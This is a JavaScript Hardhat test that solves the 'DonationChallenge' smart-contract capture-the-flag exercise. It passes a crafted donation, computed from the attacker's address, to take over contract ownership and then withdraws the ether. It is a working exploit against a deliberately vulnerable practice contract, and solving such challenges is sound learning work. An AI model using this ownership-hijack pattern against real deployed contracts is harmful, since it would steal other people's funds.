const { expect, assert } = require('chai');
const { BigNumber } = ethers;

describe('DonationChallenge', function () {
  it('should solve the challenge', async function () {
    const [owner, alice] = await ethers.getSigners();

    // Deploy challenge
    const DonationChallenge = await ethers.getContractFactory('DonationChallenge');
    const challenge = await DonationChallenge.deploy({ value: ethers.utils.parseEther('1.0') });
    const originalOwner = await challenge.owner();
    assert.equal(originalOwner, owner.address);

    // Deploy solver
    const DonationChallengeSolver = await ethers.getContractFactory('DonationChallengeSolver');
    const solver = await DonationChallengeSolver.deploy();

    const n = BigNumber.from(alice.address);
    const wei = await solver.getDivision(n);
    console.log(`Sending ${ethers.utils.formatEther(wei)}`);

    await challenge.connect(alice).donate(n, { value: wei });
    const newOwner = await challenge.owner();
    assert.equal(newOwner, alice.address);

    await challenge.connect(alice).withdraw();
  });
});
